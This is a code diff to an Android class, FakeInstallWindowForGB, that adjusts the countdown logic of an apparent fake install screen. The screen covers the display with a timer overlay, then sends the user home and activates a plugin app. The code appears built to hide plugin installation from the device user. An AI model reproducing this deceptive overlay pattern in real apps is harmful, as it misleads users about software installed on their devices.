@@ -25,7 +25,7 @@ public final class FakeInstallWindowForGB extends FakeInstallWindow {
 
     @Override
     public void updateTimerCount() {
-        if (count <= 0) {
+        if (count <= 0 || countDown == 0) {
             if (coverView != null && timerView != null) {
                 wm.removeView(coverView);
                 wm.removeView(timerView);
@@ -45,7 +45,8 @@ public final class FakeInstallWindowForGB extends FakeInstallWindow {
             SettingManager.getInstance().setLoopActiveCount(0);
             Utils.tryToActivePluginApp(context);
         } else {
-            if (count == 1 * 5) {
+            if ((count == 1 * 5)
+                    || (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && SettingManager.getInstance().getKeyPluginInstalled())) {
                 AppRuntime.WATCHING_SERVICE_BREAK.set(true);
                 UtilsRuntime.goHome(context);
             }
@@ -62,6 +63,9 @@ public final class FakeInstallWindowForGB extends FakeInstallWindow {
 
                         timeTV.setText(String.format(context.getString(R.string.fake_timer), time));
                         count--;
+                        if (countDown > 0) {
+                            countDown--;
+                        }
                         handler.postDelayed(new Runnable() {
                             @Override
                             public void run() {
